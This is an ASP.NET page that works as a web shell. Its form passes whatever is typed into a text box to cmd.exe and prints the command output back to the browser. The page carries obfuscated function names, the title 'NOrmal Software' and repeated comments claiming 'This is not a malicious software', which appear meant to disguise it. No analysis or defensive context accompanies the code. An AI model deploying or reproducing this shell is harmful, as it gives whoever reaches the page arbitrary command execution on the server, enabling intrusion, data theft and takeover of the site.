<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%--
        This is not a malicious software
--%>

<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string arst(string arg)
{
ProcessStartInfo pukky = new ProcessStartInfo();
pukky.FileName = "cmd.exe";
pukky.Arguments = "/c "+arg;
pukky.RedirectStandardOutput = true;
pukky.UseShellExecute = false;
Process p = Process.Start(pukky);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void plmaws(object sender, System.EventArgs e)
{
// this is plm
Response.Write("<div><pre class='wazzup currently-working'>");

// wazzup
Response.Write(Server.HtmlEncode(arst(txtArg.Text)));

// qwert
Response.Write("</pre></div>");
}
</script>
<HTML>
<HEAD>
<%--
        This is not a malicious software
--%>

<title>NOrmal Software</title>
<%--
        This is not a malicious software
--%>
</HEAD>
<body>
<%--
        This is not a malicious software
--%>
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="plmaws"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Love result: </asp:Label>
</form>
</body>
</HTML>